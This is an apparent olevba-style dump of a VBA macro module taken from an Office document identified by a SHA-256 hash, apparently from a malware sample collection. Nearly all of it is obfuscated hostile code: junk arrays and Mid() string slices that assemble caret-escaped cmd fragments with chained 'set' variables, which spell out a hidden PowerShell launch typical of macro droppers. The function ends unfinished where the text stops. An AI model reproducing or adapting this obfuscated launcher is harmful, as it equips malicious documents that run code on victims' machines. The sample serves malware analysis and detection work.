Filename     : ./macros/30fccfbdded3c6c2dfbfac15ae1cbe5a99086d0b0af096750aea521238e126e7
OLE stream   : Macros/VBA/VzIQjBKRp
VBA filename : VzIQjBKRp.bas
----------------------------------------
Attribute VB_Name = "VzIQjBKRp"
Function dztTrjXJq()
pMPRcM = "minvrTGpNHtNpImLSTMmMOzORTJZDNiaFAWZYnKcTrPOBkFhEpBJdKd9nTssTEuS"
wKWkiRzpo = Mid(pMPRcM, 6, 48)
LuHvm = Array("CXDVdbwH", "KWbiupTp", "rzohswoj", "jKAdOQHn", "IoliDhSj")
iLZjBQ = Array("HAMNQVZG", "iAhOQrcF", "iUlSbTtu", "PoWFDllK", "fHarkbSN")
wFvzoiv = Array("kuuNisXQ", "LjzjvzFn", "HSzczUCw", "PXjIQlVG", "BXihZjLW")
qDIFJ = "0BWJrBvd50YS7CIb5SLGnVBJSaIHKAvRqzGnWbkFojRwDYDBntvfdzcXUzjVaGMqFTnpFNUJZFREEFGtWHTQFQntWjTYuOfhWbrjkOvaZlGYfXTPrmwSmvkofuSWtvPKakicNWJIMtrUKPOwPEhIQMuaqCEqvZjdWvwupqBUdqGtEQiQfbNVkv1KrjpzFMN7Djzs8s"
XFollhO = Mid(qDIFJ, 19, 159)
WmvzRvBhEPo = Array("QFtXlCOf", "CnkSdqOQ", "rwzKJOza", "LshXRXOa", "GbLtaiKN")
znVbzXI = Array("JEGdACdL", "JRpaiANC", "FTMsUqNi", "ZKLCiVqM", "nkBEIWZI")
PzUaWaAaw = Array("PWOAinsG", "NJoHSRsS", "rbDqrajn", "bcnzwIti", "tEdzbNwm")
ajXpPloXirh = "r3w9sWBQzLp8UwduJwiqaIMjcnKjjwm5C0LDTXHaihdN"
LdGAbJ = Mid(ajXpPloXirh, 15, 15)
KQqktLzt = Array("RFoVhjuW", "siNjTjQo", "paYFAuHE", "PFNOourd", "fRYlmLGs")
tYOmWDaZb = Array("iRFQvNPJ", "npIBorlX", "wkFbVjhz", "rjBBKiCi", "TfXjoqJC")
BIbMF = Array("qEazmppn", "fBnBFfXB", "jIYLMNzI", "mdhJUCiH", "aDlQFiKB")
hZXIT = "C39VNntlZ6XTB2bBaEOGQrpU"
EkNnIlnKX = Mid(hZXIT, 4, 1)
DlqZpZzZl = Array("uNVJrAYo", "IVAjSzpc", "FSMJIfTd", "SjbCuGwA", "wXRwrpRm")
TjzuLPG = Array("EtAwCCpc", "NILnWAtO", "tsqKZWuB", "ZzhujrlP", "AaEPfUbQ")
owTCh = Array("qwomuIiz", "dCFzwGMh", "wzZCUuvW", "WwnvwdjY", "RaTaiHHQ")
LWdbVC = "Di7X0DrwYdTlwzN0sUhGjKQTzFsplIaiQIjihIDloRarsTcZCBMlrNNwXFOtHvcrNnVJjBqLDwSSjZajdSnkwpmDunLcuKdtojiFwStBLAivvuMwihPpHsuXAROtpNRs5zvipX9O7q5iwnWz4C0"
YnhTVji = Mid(LWdbVC, 19, 109)
EORNcwTbd = Array("VkRilmQt", "NWQfvYvw", "CRPwViBz", "SjhXnlzq", "sIjkdRkk")
YEChYS = Array("fthZNDds", "fXYQsJvn", "iRLFEsGb", "XZnmsLTl", "hfSbAcmP")
uPrsrJw = Array("DpsPNiwj", "MtBLFffm", "mFBnQqzT", "EnjNqUmG", "fwBOAqOo")
aRnoNFToArV = "hh52CBV8ko5EzhMZoHWWWFGdqJSjPkwiEwhbKoTEkFpWGWCkZfafLFtpmYjsZUzGnYNwzkOznSlRPjXUG7VOZprQjTm4j"
VQEfqkzvbT = Mid(aRnoNFToArV, 13, 69)
wzrrC = Array("bEZwJHfC", "zfouawwN", "qZLazlss", "GujJdRmw", "rMMLQBJw")
MQiaISCm = Array("HhNLfrjj", "zoYbfopp", "MhrPbWYi", "ssDNlnwp", "PPSRXhNP")
jVEEaQXH = Array("OzLosLQD", "WXzjJuVl", "IfSmoSvK", "sjLPVYSi", "UcAbKkph")
spbpMqKJ = "EMpjSfuTUzNipwJKHEQAtVSBtQlfSlzsQcSWfOjhtdUkiGGsJBScBtuPtnnCtOBjzUNHr1LFo8iPs7w4fPfz5Xws4t21N"
JQHkLrwjNH = Mid(spbpMqKJ, 2, 66)
rmpjvQDqZG = Array("bzqOnNfU", "ujIsOaaw", "EBwJzAhw", "FUPjutbY", "pkKobjWi")
pbBOV = Array("DqVoPZPt", "CDWJojhb", "SsJTwzaA", "FkCiPlUX", "iRFJitif")
CJXGDA = Array("EViqWRkJ", "DjWjXDfE", "QVjfWldR", "jwfWaYwY", "JdOdUjdn")
jjzWliEk = "uBtj0Z3VzkjWFpoQjshbrHRTzborjknblaOCHNatUIJhqDhzsOMRJYRFMPMoUYLNwElialIWSnHizkdwupzF1Frns6JBumY"
nmXNqoQji = Mid(jjzWliEk, 9, 75)
RVXXIVU = Array("AsbjOkAa", "lBsJJDIS", "sMGYmNji", "nwatpCjj", "svfiKzDz")
NkmUTN = Array("wElZfmOG", "VvkIcFBm", "JwsQJHli", "RMROXiIv", "JHaicJwA")
YtpnJHjjXqT = Array("jUXtSbDn", "usUOEmpq", "TCHTVAiq", "npwVfSKz", "zshpjrQq")
ilAjos = "TU4PBXpmirOTfVnJJPScPFzfmhMnRBGXabORPliOJpMpWPdqpuWpiiidszkjzPrzwsvrkzuYjDSZsHIWDWwWfRprtkZSAwPtzOqdUmGpAwIiPIlkoNfdRUShDEwzacXhoZcdRiCRQIWjILbkzoEWiUPzLK7iB"
DFNwOHZpPh = Mid(ilAjos, 16, 131)
mtlrj = Array("IiUiKtqW", "SjPZBffi", "mjGcciIb", "iURMFAHb", "mRLrfDjt")
XBTMmMuu = Array("wbDvDkwS", "MwCCloNZ", "WtwpciRR", "cnnjUnDi", "AMdBfMXw")
zFUIfzJZT = Array("WwzHzEpz", "ElVmGqQT", "KlTPwOzZ", "vUCYKLuJ", "VwTdfKUX")
FzhSpik = "zj9fPMHobn2jdn2HSC0E5PHnwunjrDAoNmICXOmCbSKWwCzBdwmqTXOCPYsFjR1o1zJcB"
zUnKYOSlW = Mid(FzhSpik, 23, 38)
kvDtTq = Array("zpfiSRbJ", "vJrutHBI", "AZMdCQnt", "qLQIWnnz", "QvRGiPHd")
EQHvLadH = Array("ssdAUAQN", "wLcGwrVj", "ClsGATmI", "VrdzqvZl", "SilJnmYq")
lEprwq = Array("vCMLKhBZ", "akEzWAdZ", "GUicXTXB", "mqnPFLtP", "MBKzGbwn")
IWKFbjlk = "kURuqFFK9zG0m9658dR8VdnSlccwIaQoGOYbaqqjISKLONJwmZrcNAlzkOCwzjIDmdJtzFhUkErWSbEYTdKjinaGcZrLnthbKHZkDPBjrXrJJPjIKidVWYUwCDRYOWjrXPLLCUUEcdrLwRzMsiBJQLElmahAwcSVqAmtEVGqJZstjJBlGEfjUXaLLZZbmTGALWVwiDIXcLAqTLbvzz7dl7LVnwh0z"
uYawANXQr = Mid(IWKFbjlk, 22, 185)
EGQTc = Array("pDWFrbOR", "EMDSHwSb", "fLYTumUO", "rokUqfSi", "WrnUwSJK")
YzawVrMIRi = Array("bVLtHaHQ", "jjSvCitD", "jHNCrubY", "tZwQIwfN", "BNrYaaHR")
IXNHHY = Array("jTlHNXbr", "zjloEGSh", "tmAiiqIk", "DEtpnUcI", "AwWYIULW")
LShSz = "UP8CAUHWThpTPzLJhmAcTIpmMmiIkTUziMjOcUNLVwlSjGJozSmEOmibPvsCWBsANqkCScJhwtjmtaHi3"
siwzizw = Mid(LShSz, 9, 61)
zaUabjLS = Array("zETYNrJu", "uJfoaYnp", "KBDIdmEd", "HcnHkuZZ", "adlZXjWM")
wqLaGKawmE = Array("vwudpnic", "JjNGRCsK", "ApRlDBKA", "jFOwnNRb", "irNfraoT")
tVQNBHt = Array("tLzDjTIY", "laZiSlJt", "otujZmpv", "OmbapNSZ", "AzrrDGUQ")
sZjbnomTXA = "KZQ8SmZdRqSOddBflzjouXmJbFikinpAOiEHSp"
tfiiJHZUpKW = Mid(sZjbnomTXA, 10, 27)
NzHRohOL = Array("zqLMojJt", "iTqwfEuH", "VBptriiX", "HzhUtRpi", "ZdljbcHf")
ZbAvhlNT = Array("dirWXUtv", "DkVBRaZP", "HnFoCozQ", "dIYCSKft", "uKQIqMAm")
iYSpA = Array("FlRIvnRw", "EWbnXSco", "ibsOvrcs", "EcHHJQZv", "mSjQXrVp")
AicwHX = "DIjtarGPPHnInpoidkaYCCFihqEJGfktrKvvHhFaqzGEoqVSzQkzjjqWfAGaiuNXOjrhitWvfAiFvAuqVmMpukJHUYPHbirvjipHwnnDtoUjBlbiGN8hQjMwWSE"
ilAOIzmkvfv = Mid(AicwHX, 15, 99)
IiwJwP = Array("razwisVb", "hcZPTlqN", "IYDSjJon", "zjAFjMRr", "FDXVujKM")
WjUCFrjA = Array("HjahrJcB", "bVIznDJh", "lJwCrQsV", "LhJPOVTb", "OqLAjHwn")
GEXswjzlzW = Array("EzdNDSEB", "uqkliIVq", "oFWJAMnG", "CjkwsIzd", "MKzrmiRt")
jiBQNjvWZ = "CqGp9ibEdZwutwmBTZbifvfDpTrhKnFHCvIEIWkszUvCpZMEZQzB"
wdrHCNbkKLZ = Mid(jiBQNjvWZ, 8, 42)
npwLDR = Array("dIVYkitG", "VUMiknns", "MXLWhHJl", "sGYXKdDK", "ndfrqPVU")
WWkhYoNz = Array("nibXwSsZ", "XFfPSuLW", "wkfiJWvr", "QCrHIvBz", "BrjCfloZ")
jCCzbpk = Array("NzAFwors", "RItGjrKR", "ikHublQb", "DhNaLIqN", "vGQKWqsb")
duCdMvSTo = "KfrNNjmfsX4QL0ZXrI7"
KBIIZnz = Mid(duCdMvSTo, 5, 6)
quNjb = Array("KwpzCvOK", "hSUvitzc", "iYBQaQhI", "SjKdazus", "rfkdvRYI")
iqTTTWlzh = Array("TDtsouiB", "IobzocBt", "QjhWkkjh", "XbEwJUjR", "ztwXWoUX")
YFYMXLzW = Array("zIVmXzDO", "iqMOjCXj", "TLVMqjsn", "HKzufdWc", "MKYbPwKa")
mbiUZEbmGN = "CjbWUQdNzvUzmMlKEzDaCbiOq9QwbAhnzlADhlUwGijSCEGpmFFMOmwwfSimwlzXUbtYqAVskmudtiMkjaLVuUYLmEXOCizUlLzbLhzmkNccsVCBGzFXZbdzCilldGqCmZshjkZwbZljswTRBVIEccuJizYcwNJdXZqScVUVYHwAqwHGOTkHzlZJiiwiLwBOQHJSFApjAnjUfuTmM7q9ZmiVlDtX"
jAWiE = Mid(mbiUZEbmGN, 27, 182)
WAWLSJZ = Array("YpUSHShz", "WNDKTHjN", "QhfNzIjA", "TkBZdvTX", "BvoAPZjp")
MbOcKLROLNq = Array("cAYSZLIF", "dLLiQwaP", "GUzXQITa", "tjIYSjwq", "AqkzkQaH")
ruhIh = Array("bvwSkkGF", "UYuuaJYU", "jwYsCknz", "MUhaMafq", "trvULApI")
NdMKvBjV = "ta3oGHKFFdkOMstiYlPcXSZMuIOdEOzKlzBRzwYtUjuCDfKtPshwUGPWbBjvtjAqjZdNrbiZMVHrXWIPwUNLhApfjiqwPdAofEWiCzCoKHkzwYwEtTzYSpIfkzdMkkKjUTLTAiMARZBaQpjKjlEvjcVpP3M5UtlN"
JoDXcSNdKm = Mid(NdMKvBjV, 7, 146)
CRHJqSvNWkt = Array("aDDumDQr", "RQTlsiEq", "IzGQDfsu", "sEBiNEIf", "IPSzhsLI")
zVhDvXMV = Array("EqIwHtzL", "nELMuZFu", "KIBhChiN", "HndcPFIQ", "ozLNXwmw")
aGKQiUoldzJ = Array("GqvIsvlj", "KXoYrdGX", "LuoUQVvh", "vvYwOsXO", "WCbLlVVL")
smjroAmh = "5siRjuuvMYjjdcwazHsipLKYTFUNFKSYlqYEMJWLpAIuiwzVSWvvhkFuQAIjn8sNPBauwmZ4mY7XAYvumY"
EjOZcCuzcS = Mid(smjroAmh, 6, 54)
WKrLPKtkZJK = Array("CuSsRjYL", "rnBcISik", "vNNwXoUR", "zaCoBulq", "ZcRWDCQL")
ztFRjYRBI = Array("WNFarvFD", "UrPYHYoN", "ZAtqhkKw", "CKDjAMjt", "wBaKjuaE")
aBNCazICt = Array("UzUJiNiA", "nEwCJZim", "DIXjrZDH", "KWbGwiii", "apWiPARp")
cWPfAlnXXIv = "XkZzEU7z4jz97s6HaFblEmSiIBqaaVwaKFWUToCIirlqTCbTKiWDnEhiLLAvsQzmOGRhnPMlDSHMBcPFaWQswvmGYrIInGQOrwbMkufuVlAVwUdjvvUVzHnTTLJwGEzwBtVDADUjqVWNuRJDOZNsmvOkKIsZkjnRnETDzZjra9ZQp4XqSzVjz"
uHYrIJmucX = Mid(cWPfAlnXXIv, 17, 153)
SUOdRzFZPu = Array("bDswPdkX", "WnHbWtMv", "vMzImcBJ", "ZRcTDwWC", "qiFohHsj")
ZlTODi = Array("mEjLWDIj", "cbmDBJDz", "BiWzBQTa", "REkooXNo", "USVhsqnW")
zNFfXWdQsho = Array("JwrbJTBj", "fFmzkufW", "kItSSUrE", "NzjinVGL", "vAnEZrQw")
rzAEXkpEwUD = "iZILzYMmwAdAoz4YbDviajpCGIznDsNoljooDQtVHwvjOXqBkioMArlJzJcbz3"
DRXWZvWz = Mid(rzAEXkpEwUD, 20, 37)
qvdUmjSoo = Array("DEIjlOEZ", "mzzjwVDp", "EmOLjSsK", "waEjGbzs", "svOOLITz")
wIOuIVVuzqo = Array("tJvoXWPa", "zwzmdFOk", "LzkKKVSL", "CFrAGoiv", "TOSZWEnc")
NjBrokfDN = Array("LdmIbKOn", "hiDNYIoY", "rkmRiOTI", "UETOmoNG", "KHwjjJkr")
BZIpF = "3Han7ik79HlhQEwhXciXkNFiPUAImVNLmrhwIwGQZGjzkAKZvNMFLkOahZdTTbPQOTTYXzZbWNzdiItOKbNYJHzBcGQjSmwwqTjQhlCzokjzmkwZfPJsNqGGURwQhqJjQznLYchYYPkYXBPrKrDDdEkAMcwPpmzm7jA"
uTvuhIkhm = Mid(BZIpF, 13, 146)
wsDwkIw = Array("qESblQXK", "atimSVzw", "KdoXrzAt", "QwDQKIpi", "zubawsWD")
YcodnCR = Array("jJosFbop", "KBWFUNAr", "EZLpNGAR", "EAmXuXAR", "GlqiLHnp")
izLnfcw = Array("HNGIljNm", "ujVWjhqa", "IXoFoRvn", "BEwjWSjw", "lWhzArfU")
dLikVzpTwh = "nbAHE45oj1iajGQAiXmJtWRSXrXiCcraiofbllJtsLWVZESndPLPAszrkQbcqfiJnStvboPwNtQhAvtTZkEmRcZlonrUJhCNhMiGKWMpAOBHbSroXIDGbrsKsIMmO9MiMfBj"
UTpdQEz = Mid(dLikVzpTwh, 13, 110)
uKmKbj = Array("mAdKBdlZ", "uPZnThBq", "SSHhldPc", "DYkKzqaQ", "rTSnolmX")
KpLScMl = Array("TZoHssdE", "UrhhkwjJ", "lAGcsaZE", "pIwzONCh", "jjNLoIjL")
cdcnWTDZidh = Array("ujpIJsjt", "kJCniJit", "AkRkvipH", "pAABkXUc", "RvhMkQuw")
zOlcZ = "VpE7KvTC570wJO0ntQaSXWSMJJpsAmYwwwklSDYGFqwVRjHcmPtfYtpamYURwQVjPKlAzrirRtMhXzvZBNFkstXDHKztiGJpVRFGzHculBNfjICodvQiKknVnitorkJKjXMFrobukLwrfsWzILQmqbikijTPNnCAsCvJwwwoTVzzmwquLujjUsYd0WW3CjYuw0ic6rXCF"
TfEQEYZQD = Mid(zOlcZ, 20, 162)
MMHVOvzn = Array("cDOFKPCX", "FULEqwQQ", "riTJsiIM", "pZVjbSIj", "pVIrPkwa")
KWIRWzk = Array("zdvPMPmS", "iRUCzlEz", "uCPltTvn", "McOVqYAH", "ltLOjtAZ")
BjHbWOiG = Array("nDEJzGlE", "RLwNULji", "hHDjBQcG", "RNQEZpNB", "BpzqOmqF")
MLNhTT = "4iWvaMV8ihiEBsiCDdopLCtiLcwdKjLKPDjUuwMowpjrkvqSLZjStnlTTaj0"
Yjwzp = Mid(MLNhTT, 12, 44)
ZOCJdoLrESV = Array("rJEfbmma", "MhjbqQXW", "azsjqjib", "zvMfNqPv", "RzsrMzfi")
wzMIf = Array("bpssJlLk", "RbPRtGPK", "fchfaHMV", "SkKsYjJd", "SOIAnlSL")
dNAVvwDAfH = Array("jcNmbwCK", "iiMjPzET", "cXaYbTMl", "RlwfzOWt", "KVwwtatU")
nPRlAUPcNDG = "0MUz5HbQ5M35zGwM4kp68MHOWvruETqDZzBffMfEOGzGtniOuRTfzfODszWXIkIjbVccOKAzBhqoiVbCNcznAKEtiwniqHwiwQfXLFzkQViRpZUWVTKjkUjQRjuQWSGtlMpSpEqHcPXifmDIiQMWzPtikOGcLjNwOljdkBjRcCDUzBkifllGGkvVSLhbzOwtCZPuFaYckFMCPT7SvbXHQ"
fLTfklaw = Mid(nPRlAUPcNDG, 26, 176)
IimoL = Array("izJpTaNS", "KpXQLtkQ", "PbVqzXNT", "LSYtDFZC", "iGpbJWRq")
uboST = Array("XfVIrFhR", "kfiSEDUL", "mqdABTPE", "PVmFDJHt", "JiSTBEcG")
WjYwPGBMUqP = Array("lHJXXHza", "lioTsRpD", "QRtWTbNb", "YoIalBJh", "NXPtKrjH")
iVRbB = "sMz3sYIfjLvq9niXizqaGsTYdAuViKYlZwGrIzaNwMunlwoGEjEALzipcWRLDIzFQWSwRpqAdzZMPE5i8TcZTi"
TSQjqTRdKz = Mid(iVRbB, 22, 48)
RpjOIYtMNW = Array("XLUZUnBs", "oODkLGmJ", "uhziwXpk", "VHFUBwtY", "klwHHnGk")
mbRKqTGQNh = Array("nQlWzYVH", "lGwcszJA", "WjENihrs", "ViAaHiBG", "bOvilSmw")
HNCOtvPzl = Array("lwiuzQjm", "bwlXjsCG", "YsBTYvzG", "FrBdBaOD", "zHckwzvF")
wzNkLbBfp = "bHj1JPbUQYRDbkzBiMFpjazkqtzlDuQJUqYGmzVjbGCmEtbMBbNZkinoEihwHpRVHIjkMsPjqYOdYLjzSlkbhqZqDkBHRWZmojiwKqAJMijMPJPsjQSpWOD5oi7sQiaCXPiMU"
clTpSqq = Mid(wzNkLbBfp, 7, 106)
WYiPmBOkY = Array("zNwItdXj", "MpJsRSYp", "wboFPDkB", "khabPRHb", "zwWKwqNb")
znFibTZ = Array("URQMQVmi", "jmlWIqpu", "czYLDvTu", "hivUvNtH", "ONlzmYkO")
ZjSEojq = Array("vvscjlSH", "GcizSCYY", "zVihaRiV", "tdIvFsHE", "MJPHDrOw")
JzJzP = "6taSssRWUItbbHVMhzIwwcwNCLObTUdiwhtYDSGWjVinQUUoSGoArozNzwrVRtDzfOduOzIOqlRi1Pfzpzb7qi"
RJQRj = Mid(JzJzP, 8, 68)
YYfcJbcDwTo = Array("QoOTftpL", "oMzQtCod", "MWiDcXCN", "UimInQUG", "HiRmDPqz")
TqGNK = Array("nwGssqKK", "VlvhILTt", "lAwBHhYY", "stJLkCaz", "fiPfQJVi")
BFDpEYcaho = Array("TcmBVnzw", "OYACQpsG", "YhAzhwZT", "LwBZvncc", "fUhiuXDE")

OzXwTltrj = "Ho^w^e^rSdGVdHRrSzjlOXmOaz"
MMXwDavXn = Mid(OzXwTltrj, 2, 7)
qYNktl = Array("BpzZHwVJ", "vhZiERrJ", "RdvfRwYr", "iCoqSwZi", "BqSDRtRL")
BCBNF = Array("fFkJTtFj", "TsIuzRAC", "QGqEHfrw", "IqcNwnrY", "MkzLOPXp")
lmQJwEwdBmo = Array("zIWZqilj", "pPmLDMDA", "OnBdQrhf", "BkhNSpoB", "iBHzIRGd")
fwwwf = "Xw&&set %wuYlSlwEZAQX0Hl0QE5hpirOvfYWfZD4hbrzaU5AuuQ"
rWPlMGR = Mid(fwwwf, 3, 13)
kwpHrdtiKw = Array("FsXjBfUA", "jwzbNuYF", "arYGzYRA", "bkdCEEsw", "jXXYUwiV")
MCNfb = Array("PhjTrMno", "cCZRtAjh", "bXIQCSvc", "GBuqWAlc", "MDqPrzIO")
vHWbSnNGu = Array("wpZCfaDj", "rqwwqNTw", "mENqRzRc", "QwEpJRqi", "OtTNtswf")
AtTTdroBRz = "3wjwaaP5PIOQ%pRHiJpOks%!uY"
QRKbAwVzHKV = Mid(AtTTdroBRz, 13, 12)
EJHbLjsM = Array("zOwjEomw", "jucmkSwz", "XwliVNWa", "ASiwuFCt", "IhsDzkYc")
iinUnb = Array("KFFPoDuv", "wUpwGOKk", "rYjlFpEi", "riiCZtzm", "YJXQHGlw")
EmwLjMcps = Array("YmzZQGmt", "XILbEmWV", "AbYFZrVD", "UCXwqtcl", "mjNTqfNl")
moEpBJwXR = "4mAERSIlD4Kt7EKFKirz8rqjEihlRLAVnfKP6"
pIfmtf = Mid(moEpBJwXR, 2, 4)
CVhmkjRUQT = Array("wkfRhYhm", "nCPfifXj", "QvENipDd", "faoVYDiV", "OnJoLEWw")
WcEjHilwc = Array("UlJnizCH", "LjCuazCG", "hCmGkMOk", "XtRuViVM", "ZIswjPwi")
lOIpDjDLjYz = Array("XhKrBkuO", "kDHIRPLI", "XZQkfHlc", "LpVSGFZR", "DEiDCWjn")
vCsQG = "77tFCSXiIkl5PZzdwfFifTiGbCU"
zjwOIjvh = Mid(vCsQG, 14, 10)
loSSmj = Array("zDKSbMvJ", "wkZHzOCP", "vhjLObHi", "ipFMjIGA", "qclbzTBw")
pcBZonPjtK = Array("uLWWjSSp", "BSHUqXZX", "wfolHicn", "dYRXcbSc", "fhRCFkwL")
XCJwwGPwV = Array("WPLNBlKS", "CNiSfPrL", "jisHBvMa", "AioIGWSM", "jcPrWPms")
JRQUwAXfA = "vQw192Et %LmAUN1Ej4z15E"
pLDnOjRRAf = Mid(JRQUwAXfA, 8, 7)
wLRDb = Array("OwUPwzzQ", "qFTWrrKb", "DlNWwBMf", "uSlCAzoT", "wAtCbwdA")
HzwijZio = Array("hYSADvUp", "SoolCPvN", "moVdOuQq", "QzarwHzG", "HMpYiLcz")
uENAW = Array("wwkLKDRj", "FfPmbzmn", "HcjEVdrK", "oidpaWia", "MWfSKEfN")
RXaQhDEGmYz = "Qmi0d5IXfH^s&&set %Vvuj4zb5"
mNDzIv = Mid(RXaQhDEGmYz, 11, 13)
usXvC = Array("hulSrMiI", "ZCQGcYdU", "EZXcZbFi", "BpaFTUcD", "wVWarZTb")
YBjTW = Array("DVPYFXwn", "sLNkjDoF", "oCQCmYoF", "ZNKGCDcf", "GwYDMjdd")
bzvnpZGZnMS = Array("qmNIHsWt", "hQlpIQpf", "hKzsNslo", "ihikiktI", "ZmMzLfwj")
mSoEcJ = "oVkHJPfrtXJ4jvzwj86kDm4OvupTNVjP45E1YlTPi"
motOCvQ = Mid(mSoEcJ, 6, 6)
rjdiAdvIh = Array("rRZlRnXp", "GtWBjlQw", "AYZZOlOw", "WdPVEpTB", "LTAvSAWv")
rQodhOmswW = Array("KodkOsbo", "VOzmFZSF", "CdPoXBlR", "ZUqNkUfA", "BiPaHdhi")
jinSCbCjz = Array("BbAqqhvm", "AvtpkiXJ", "CMKtBNDB", "iwkbJrwY", "vlmwBvbs")
wpLzCs = "470qrq%=p&&set %KcTnD6szzf6w88PDiFwD7"
hRlKHnoM = Mid(wpLzCs, 4, 14)
NLfZZTCZ = Array("YDNpbpQT", "HFXvTnco", "XwHrzUcI", "zUuwwbIG", "kSVwAOZt")
SwBYOGLj = Array("iRTEUDFH", "IwYCokvD", "bEsHvRXf", "zQKASinI", "ZNJfBYou")
uMzhiwiZz = Array("OmqzCGSA", "WRWwWSzR", "tnHDsEpi", "KQcabPCC", "PzsIbZdq")
TzFsPYO = "joQD1sMHucTGfF7R7ZzTcw2zOqpZsc7kwpMn5PAIC8T"
zCHQt = Mid(TzFsPYO, 27, 4)
kwMXSYQ = Array("wKdAHrlH", "QrmNQlBJ", "zLnmdrZH", "OTjYZppU", "KQFiaoXS")
himIjv = Array("iUKjdpmi", "wiLPmqMG", "kWmnKMia", "CSCAjTiJ", "oUHJhqiZ")
lRskkLBU = Array("hCcqiaiT", "DwzECjIR", "mjhKmlwd", "ABbRjDYu", "sMFIkrwc")
GpSdN = "3iJ5z83DXAlzKBaXtzS&&!fNiOKi4S"
OjJIjiwsq = Mid(GpSdN, 12, 11)
rfCwDj = Array("kjwhViHE", "MqWzJTnw", "EzqcwQkA", "ZDMpiAhu", "mEaDpQIV")
qizKckiBlzJ = Array("uXEshblY", "ZJDlBUdT", "wwHSSRaM", "IbKEsjHn", "rUibLrSw")
muvRuVCT = Array("RnQUwwsS", "bHEsIpDc", "wskFQhjp", "CPuhlCHH", "dJAfBFPM")
vOIcANX = "ipP10q0MSB%=^h^e^l^l&&sehhVFDDUzKh0FWdQ"
KKwDuXX = Mid(vOIcANX, 11, 14)
ZFzwSzDU = Array("irclfOiB", "QFiTHNij", "GaSjCLhY", "zzOzpYbq", "cXWYEuKn")
GrVYoCsUa = Array("ksRjXozQ", "aQYaniKX", "KEmhzfMs", "ioqjqJfM", "QiwJuABK")
PDwCNRI = Array("zwYYzBCt", "NwNAIcoF", "jYCjwQZR", "lMKJmBdJ", "CbkBGosd")
qAEnm = "D1YDAbETliXtsTrHkhUwFUZMDVo7Ktbq2ucjM4B4Ez"
jVULd = Mid(qAEnm, 3, 9)
FODIrPM = Array("lwWrwiEn", "pqcVwRMh", "YHmnqtHM", "VDzjsmzs", "jZwBuiVH")
vZziwaC = Array("IWTwYILl", "PDdwBEms", "pJWsjYvD", "qjpZTKnq", "mifUZKnN")
ioimpKwrp = Array("sMQoJAqb", "mGMkMdbj", "aQFoSlSF", "QnMXZRSi", "WIzTHHtq")
LTKwQdI = "klr7UNGlzPmzfEFZWQsdumD40iw44Y"
csFXvElwPn = Mid(LTKwQdI, 10, 1)
FhrSpEzmwDq = Array("tNmMzDiJ", "CvtJEzuH", "tLYWoTCU", "nhODdHcT", "WPvFwFHN")
PIqNahQiNva = Array("ICUdYJaW", "OrawiXBa", "LSZQpafv", "TZmpDoIo", "DLNlwYwi")
imnCzFjR = Array("Hrolhflz", "NVujjqYi", "WZKwWkTZ", "jlsXJPbm", "VuIzmuNn")
PErKOwFmJG = "t1idRrset %T0MWM6"
oDQvprT = Mid(PErKOwFmJG, 7, 5)
uoTHtZMV = Array("omciucHM", "nfOYOzHX", "XPCvnNqz", "tHKliawc", "LWKkIkiG")
XjnnkwY = Array("ifkiBDXY", "nlZWrSAa", "wipnRWiM", "jlNsnXOn", "kwRHdLwq")
GuVTwpicCMR = Array("jmwwAZlt", "VjnduroH", "BXuPpfkQ", "WmlvAtzk", "hzDfXiMJ")
fqNvssWOUa = "r8LAotkFvJtM%wuYlSlqrq%!!kEwHwzjuv1rL6UF"
ucBIITqIaE = Mid(fqNvssWOUa, 13, 13)
XIKlaS = Array("AUWEjlst", "HJGFRhAD", "BiZNnqsc", "lCvvnJkS", "KlOVJjjl")
VHCDGRHX = Array("tsnqnrTA", "zzdpJwWJ", "btShpzFw", "ZnvjSiuU", "BnUvCBpu")
kwsLw = Array("jvvnfuJM", "OFtQOwwv", "mpRzwniU", "FInVibGZ", "DXwuBSSf")
kHSEq = "c10uwwwrqW%NzKzklA2"
SkrVkAkMFMh = Mid(kHSEq, 5, 7)
KSrwUirjqs = Array("diRNkiGC", "qYINkpzv", "MbiWGnin", "wUMqACuU", "XlVNWVjb")
fWvnTV = Array("CliFStpO", "ZChajvZp", "AdOQRPCo", "inpwUkYr", "rGUVJcVE")
doVAmjTu = Array("iwRzVTkc", "MfNtGSJn", "iqbiDqtp", "dpidaDjY", "HJmTwESK")
MzpNRrc = "Bji4fYmt&set %pbrjj8w0w"
sXKfKiaTR = Mid(MzpNRrc, 9, 7)
YinoijlGj = Array("DNmoXflZ", "zjmSBqBo", "EbTflHBI", "wolwjppi", "YQbpEFSw")
pbOrMLGvWM = Array("EJfuROWQ", "IwPWknZv", "MdpitosH", "rHtlPLjw", "IVbcbGqk")
ahszUBVCHM = Array("RUniaStl", "qfdaQkEP", "QYDJUlBz", "OQNPLzUF", "mFQZBKhY")
zBvrJiQEciV = "3OhNQhjMmcfXfmjN0kVdUi%=Ck0p"
mIUcibQla = Mid(zBvrJiQEciV, 19, 7)
vwjLjCC = Array("OIujhIiY", "QLMDDhPj", "TpTJEiZt", "LXnKUfOF", "rivMrRPF")
hWrhlqmjK = Array("hpwAkRCF", "pkFLrXTk", "jAYKVXDl", "wGLYlDoB", "aNbPfYIu")
LHfHXkVK = Array("ViVkZDNT", "LLcqtFkJ", "lNEiFdTm", "vEldvEEK", "sdpmCTLs")
kqUMY = "PGfH6zjFwcbz5aiSPsc%!  39OwziMQ1sE4K0JoTrjHCN"
FmKZwQnVhmm = Mid(kqUMY, 18, 6)
sBrRVQIaLX = Array("trNaawHV", "cRdSUips", "OioVSkXH", "GRwQPwHR", "BLkNPtLz")
TIQrPuzhETd = Array("wPAdamqN", "ozYTfqaJ", "UGTJzrFi", "KLQJtbcV", "XrYCjtjU")
AiBzZl = Array("blbSZnmL", "kbtJZCzF", "KVTPWhTM", "UCwnSXZa", "ZzhOPmEX")
iodZqbH = "045nd8jd3jcFwNsfTzG7Fasi0NYwcwITtPSYH%=A4YN"
fAbdcAVri = Mid(iodZqbH, 27, 14)
nkTAMG = Array("YEYRiTvV", "uSsNaRwu", "RPzXrzsN", "BTjaUipX", "QvqRIBiB")
DJjQXXi = Array("HatzfMzI", "AnzAphjZ", "LLPPjUAL", "cUwibjlP", "kwPQGthp")
oVJHJ = Array("UbZhlpij", "PQFzlPSm", "ZhWKQUhU", "BhPtSPTS", "dauHvTZn")
KbbhsN = "toaYuODYwj5&&sicu0VE2IMT71MIUEPkw7iSQFUtp"
iSqnikwKzi = Mid(KbbhsN, 12, 3)
kvCcnDnn = Array("mNPKaodV", "ddqYWWZz", "uFfEZpQA", "zmULULrG", "IiYCFWtN")
